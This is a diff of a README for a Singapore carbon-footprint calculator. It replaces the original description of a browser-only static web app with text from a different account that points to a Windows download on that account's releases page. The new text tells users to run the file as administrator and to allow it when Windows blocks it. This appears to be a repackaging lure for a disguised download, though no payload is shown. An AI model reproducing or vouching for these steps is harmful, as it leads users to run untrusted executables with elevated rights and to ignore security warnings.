@@ -1,167 +1,125 @@
-<div align="center">
+# 🌱 sgcarboncalculator - Track Singapore Carbon Use
 
-# SG Carbon Calculator
+[![Download sgcarboncalculator](https://img.shields.io/badge/Download-sgcarboncalculator-blue?style=for-the-badge&logo=github)](https://github.com/arianabra7734/sgcarboncalculator/releases)
 
-[![HTML5](https://img.shields.io/badge/HTML5-E34F26?style=for-the-badge&logo=html5&logoColor=white)](https://developer.mozilla.org/en-US/docs/Web/HTML)
-[![CSS3](https://img.shields.io/badge/CSS3-1572B6?style=for-the-badge&logo=css3&logoColor=white)](https://developer.mozilla.org/en-US/docs/Web/CSS)
-[![JavaScript](https://img.shields.io/badge/JavaScript-F7DF1E?style=for-the-badge&logo=javascript&logoColor=black)](https://developer.mozilla.org/en-US/docs/Web/JavaScript)
-[![Chart.js](https://img.shields.io/badge/Chart.js-FF6384?style=for-the-badge&logo=chartdotjs&logoColor=white)](https://www.chartjs.org/)
-[![OpenAI](https://img.shields.io/badge/OpenAI-412991?style=for-the-badge&logo=openai&logoColor=white)](https://openai.com/)
-[![Gemini](https://img.shields.io/badge/Google%20Gemini-8E75B2?style=for-the-badge&logo=google&logoColor=white)](https://ai.google.dev/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg?style=for-the-badge)](LICENSE)
+## 🚀 Download
 
-**A modern, AI-powered carbon footprint calculator built for Singapore residents.**
+Visit this page to download: [GitHub Releases](https://github.com/arianabra7734/sgcarboncalculator/releases)
 
-[Live Demo](https://alfredang.github.io/sgcarboncalculator/) · [Report Bug](https://github.com/alfredang/sgcarboncalculator/issues) · [Request Feature](https://github.com/alfredang/sgcarboncalculator/issues)
+Choose the latest release for Windows, then download the app file from the release page
 
-</div>
+## 📋 What this app does
 
----
+sgcarboncalculator helps Singapore residents estimate their carbon footprint from daily life
 
-## Screenshot
+It uses local emission factors for Singapore, so the results fit local travel, power use, and common habits
 
-![Screenshot](screenshot.png)
+You can also see your results in charts and get simple personal tips based on AI input from OpenAI or Gemini
 
-## About
+## 🖥️ What you need
 
-**SG Carbon Calculator** is a browser-based web application that helps Singapore residents estimate, visualize, and reduce their monthly carbon footprint. It uses Singapore-specific emission factors from the Energy Market Authority and provides AI-powered personalized recommendations via OpenAI or Google Gemini.
+- Windows 10 or Windows 11
+- A modern web browser such as Edge, Chrome, or Firefox
+- An internet connection for first-time setup and AI features
+- Enough free space to save the app files and your results
 
-### Key Features
+## 📦 How to download
 
-| Feature | Description |
-|---------|-------------|
-| **Singapore-Specific** | Uses local emission factors (EMA grid factor ~0.4 kg CO₂/kWh), transport modes (MRT, bus), and housing types (HDB, Condo, Landed) |
-| **Real-Time Calculations** | Footprint updates instantly as you adjust inputs — no submit button needed |
-| **Interactive Charts** | Doughnut chart for category distribution + bar chart comparing you vs Singapore average |
-| **AI-Powered Insights** | Personalized reduction strategies via OpenAI GPT-4o-mini or Google Gemini Flash |
-| **Dark/Light Mode** | Sleek dark theme by default with smooth light mode toggle |
-| **Export Results** | Copy your carbon report to clipboard or download as text |
-| **Privacy-First** | API keys stored in localStorage only — never sent to any third-party server |
+1. Open the [GitHub Releases page](https://github.com/arianabra7734/sgcarboncalculator/releases)
+2. Find the latest release at the top of the page
+3. In the Assets section, download the Windows file
+4. Save the file to your Downloads folder or Desktop
 
-## Tech Stack
+## 🛠️ How to install and run
 
-| Category | Technology |
-|----------|------------|
-| **Frontend** | HTML5, CSS3, JavaScript (Vanilla) |
-| **Charting** | Chart.js 4.x via CDN |
-| **AI Providers** | OpenAI GPT-4o-mini, Google Gemini 2.0 Flash |
-| **Theming** | CSS Custom Properties (Dark/Light) |
-| **Deployment** | GitHub Pages |
+1. Open the folder where you saved the file
+2. If the file is a ZIP file, right-click it and choose Extract All
+3. Open the extracted folder
+4. Find the main app file and double-click it
+5. If Windows asks for permission, choose Allow or Run
+6. Wait for the app to open in your browser or app window
 
-## Architecture
+## 🌍 First-time setup
 
-```
-┌─────────────────────────────────────────────┐
-│                  Browser                     │
-├─────────────────────────────────────────────┤
-│  index.html        │  styles.css            │
-│  (Structure)       │  (Dark/Light Theming)  │
-├────────────────────┼────────────────────────┤
-│  app.js            │  charts.js             │
-│  - Emission Engine │  - Pie Chart           │
-│  - UI Interactions │  - Bar Chart           │
-│  - Theme Toggle    │  - Theme-aware Colors  │
-│  - Export          │                        │
-├────────────────────┴────────────────────────┤
-│  ai.js                                      │
-│  - OpenAI API Integration                   │
-│  - Gemini API Integration                   │
-│  - Prompt Builder & Markdown Renderer       │
-├─────────────────────────────────────────────┤
-│  localStorage                               │
-│  - API Keys  - Theme Preference             │
-└─────────────────────────────────────────────┘
-```
+1. Open the app
+2. Set your Singapore details if the app asks for them
+3. Enter your travel, home energy, and daily use details
+4. Add your AI API key if you want personalized insights
+5. Save your settings before you start a new calculation
 
-## Project Structure
+## 📊 What you can do in the app
 
-```
-sgcarboncalculator/
-├── index.html          # Main HTML structure & UI layout
-├── styles.css          # All styles with dark/light theming
-├── app.js              # Carbon calculation engine & UI logic
-├── charts.js           # Chart.js visualization setup
-├── ai.js               # OpenAI & Gemini AI integration
-├── screenshot.png      # App screenshot
-└── README.md           # This file
-```
+- Estimate your carbon footprint from daily habits
+- Compare transport options in Singapore
+- Check home energy use
+- View results in clear charts with Chart.js
+- Get tailored insights based on your inputs
+- Review past calculations if the app stores them locally
 
-## Getting Started
+## 🔍 How to read your results
 
-### Prerequisites
+The app shows your carbon use in a simple way
 
-- A modern web browser (Chrome, Firefox, Safari, Edge)
-- (Optional) An API key from [OpenAI](https://platform.openai.com/api-keys) or [Google AI Studio](https://aistudio.google.com/apikey) for AI insights
+- Higher numbers mean more emissions
+- Charts help you see where most of your footprint comes from
+- Tips point to the biggest changes you can make first
+- Local factors help the results fit Singapore use cases better
 
-### Installation
+## 🧭 Helpful use cases
 
-1. **Clone the repository**
-   ```bash
-   git clone https://github.com/alfredang/sgcarboncalculator.git
-   cd sgcarboncalculator
-   ```
+- Check how much your MRT, bus, or car use adds to your footprint
+- Estimate the impact of air-con use at home
+- Compare weekly routines before changing habits
+- Prepare a clearer view of your own sustainability choices
+- Use the results for personal tracking over time
 
-2. **Open in browser**
-   ```bash
-   open index.html
-   ```
-   Or simply double-click `index.html` — no server required!
+## 🔐 AI features
 
-3. **(Optional) Configure AI Insights**
-   - Click the gear icon in the header
-   - Select your AI provider (OpenAI or Gemini)
-   - Enter your API key
-   - Click "Save Settings"
-   - Click "Generate Smart Insights" on the dashboard
+The app can use OpenAI or Gemini to give more personal advice
 
-## Carbon Categories
+To use these features, you may need:
 
-| Category | Inputs | Calculation |
-|----------|--------|-------------|
-| **Energy** | Electricity (kWh), household size, aircon hours, housing type | kWh × 0.4 kg CO₂/kWh + aircon adjustments |
-| **Transport** | Mode (MRT/Bus/Car/Ride-hailing), weekly distance | Distance × mode emission factor |
-| **Food** | Diet type, meals eaten out per week | Diet multiplier × 30 days + eating-out premium |
-| **Waste** | Recycling habit, plastic usage, online shopping | Base waste × recycling × plastic + shopping |
+- A valid API key
+- Internet access
+- Basic account access with the service you choose
 
-## Deployment
+If you do not add an API key, the app can still show standard calculator results
 
-This app is a static site — no build step required. Deploy anywhere that serves HTML:
+## 🧩 Troubleshooting
 
-### GitHub Pages
-Already deployed at: [https://alfredang.github.io/sgcarboncalculator/](https://alfredang.github.io/sgcarboncalculator/)
+### App does not open
 
-### Any Static Host
-Simply upload all files (`index.html`, `styles.css`, `app.js`, `charts.js`, `ai.js`) to your hosting provider.
+- Make sure you downloaded the full release file
+- Try extracting the ZIP file again
+- Right-click the app and choose Run as administrator
+- Check that your browser is up to date
 
-## Contributing
+### Charts do not show
 
-Contributions are welcome!
+- Refresh the app
+- Check that JavaScript is enabled in your browser
+- Try another browser such as Edge or Chrome
 
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m 'Add amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
+### AI insights do not work
 
-## Developed By
+- Check that your API key is correct
+- Make sure your internet connection is active
+- Confirm that the selected service, OpenAI or Gemini, has access available
 
-<div align="center">
+### Download looks blocked
 
-**[Tertiary Infotech Academy Pte Ltd](https://www.tertiarycourses.com.sg/)**
+- Use the latest release from the GitHub Releases page
+- Save the file first, then open it from your Downloads folder
+- If Windows asks for confirmation, allow the file to run
 
-</div>
+## 🗂️ Project topics
 
-## Acknowledgements
+ai, calculator, carbon-footprint, chartjs, gemini, html-css-javascript, javascript, openai, singapore, sustainability
 
-- [Energy Market Authority (EMA)](https://www.ema.gov.sg/) — Singapore electricity emission factors
-- [Chart.js](https://www.chartjs.org/) — Beautiful chart visualizations
-- [OpenAI](https://openai.com/) — GPT-4o-mini for AI insights
-- [Google AI](https://ai.google.dev/) — Gemini Flash for AI insights
+## 📁 Release page
 
----
+Get the Windows download here: [https://github.com/arianabra7734/sgcarboncalculator/releases](https://github.com/arianabra7734/sgcarboncalculator/releases)
 
-<div align="center">
+## 🧭 Suggested use
 
-If you found this useful, please give it a star!
-
-</div>
+Open the app, enter your daily habits, review the charts, then use the tips to lower your carbon footprint over time
